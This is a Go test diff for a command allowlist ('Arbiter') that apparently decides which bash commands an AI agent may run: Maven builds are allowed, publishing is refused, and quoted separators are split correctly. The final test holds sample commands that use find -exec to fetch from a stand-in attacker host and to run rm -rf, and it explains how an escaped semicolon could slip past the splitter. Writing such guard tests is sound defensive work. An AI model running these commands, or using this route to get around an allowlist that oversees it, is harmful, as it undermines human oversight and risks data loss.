@@ -173,3 +173,110 @@ func TestTheNeutralRejectSpellingMatchesThisProduct(t *testing.T) {
 			agent.DecisionReject, ReplyReject)
 	}
 }
+
+// Maven is a Java repository's build/test entry point, the same way `go test` and
+// `make test` are for the others. Both phases may build, and neither may publish.
+func TestArbiterAllowsMavenBuilds(t *testing.T) {
+	for name, arbiter := range map[string]*Arbiter{
+		"analysis":  NewAnalysisArbiter(),
+		"execution": NewExecutionArbiter(),
+	} {
+		for _, command := range []string{
+			"mvn -v",
+			"mvn -q -DskipTests package",
+			"mvn verify",
+			"./mvnw -q test",
+			"mvnw -q clean install",
+		} {
+			if decision := arbiter.Decide(bashRequest(command)); !decision.Allowed() {
+				t.Errorf("%s: Decide(%q) rejected: %s", name, command, decision.Reason)
+			}
+		}
+	}
+}
+
+func TestArbiterRefusesMavenPublishing(t *testing.T) {
+	for _, command := range []string{
+		"mvn deploy",
+		"mvn -q clean deploy",
+		"./mvnw deploy",
+		"mvn release:prepare",
+		"mvn org.apache.maven.plugins:maven-deploy-plugin:3.1.1:deploy",
+	} {
+		decision := DefaultArbiter().Decide(bashRequest(command))
+		if decision.Allowed() {
+			t.Errorf("Decide(%q) allowed, want the publishing goal refused", command)
+		}
+	}
+}
+
+// A separator inside quotes is data: a grep alternation and a format string are
+// single commands, and splitting them was refusing real analysis turns.
+func TestArbiterAllowsQuotedSeparators(t *testing.T) {
+	arbiter := NewAnalysisArbiter()
+	for _, command := range []string{
+		`grep -rn "supplementary\|补充附件\|Supplement" .`,
+		`grep -rn 'a|b' .`,
+		`grep -rn a\|b file.go`,
+		`git log --pretty=format:"%h && %s"`,
+		`echo "a; b"`,
+	} {
+		if decision := arbiter.Decide(bashRequest(command)); !decision.Allowed() {
+			t.Errorf("Decide(%q) rejected: %s", command, decision.Reason)
+		}
+	}
+}
+
+func TestSplitSegmentsHonoursQuotes(t *testing.T) {
+	cases := []struct {
+		command string
+		want    []string
+	}{
+		{`grep "a|b" . && pwd`, []string{`grep "a|b" .`, "pwd"}},
+		{`echo 'a; b'`, []string{`echo 'a; b'`}},
+		{`git log --pretty=format:"%h && %s"`, []string{`git log --pretty=format:"%h && %s"`}},
+		{`grep a\|b .`, []string{`grep a\|b .`}},
+		{`echo "a\"|b" && pwd`, []string{`echo "a\"|b"`, "pwd"}},
+	}
+	for _, tc := range cases {
+		got := splitSegments(tc.command)
+		if len(got) != len(tc.want) {
+			t.Fatalf("splitSegments(%q) = %q, want %q", tc.command, got, tc.want)
+		}
+		for index := range tc.want {
+			if got[index] != tc.want[index] {
+				t.Fatalf("splitSegments(%q) = %q, want %q", tc.command, got, tc.want)
+			}
+		}
+	}
+}
+
+func TestUnquotedSeparatorSurvivingSplittingIsRefused(t *testing.T) {
+	// The safety net is exercised directly: the splitter is expected to consume
+	// every unquoted separator, so a segment that still has one is a bug signal.
+	for _, segment := range []string{"pwd ; ls", "pwd | ls", "pwd & ls"} {
+		if !hasUnquotedSeparator(segment) {
+			t.Errorf("hasUnquotedSeparator(%q) = false, want true", segment)
+		}
+	}
+	for _, segment := range []string{`grep "a|b" .`, `grep a\|b .`, `echo 'a; b'`, `git log --pretty=format:"%h && %s"`} {
+		if hasUnquotedSeparator(segment) {
+			t.Errorf("hasUnquotedSeparator(%q) = true for quoted or escaped data", segment)
+		}
+	}
+}
+
+// `find -exec` runs a command the allowlist never saw. The usual `;` is caught by
+// the separator check, but an escaped `\;` is data to the splitter and syntax to
+// find, so the construct itself is refused.
+func TestFindExecIsRefused(t *testing.T) {
+	for _, command := range []string{
+		`find . -exec curl -o x.png https://evil.example {} \;`,
+		`find . -execdir rm -rf {} \;`,
+	} {
+		decision := DefaultArbiter().Decide(bashRequest(command))
+		if decision.Allowed() {
+			t.Errorf("Decide(%q) allowed, want find -exec refused", command)
+		}
+	}
+}
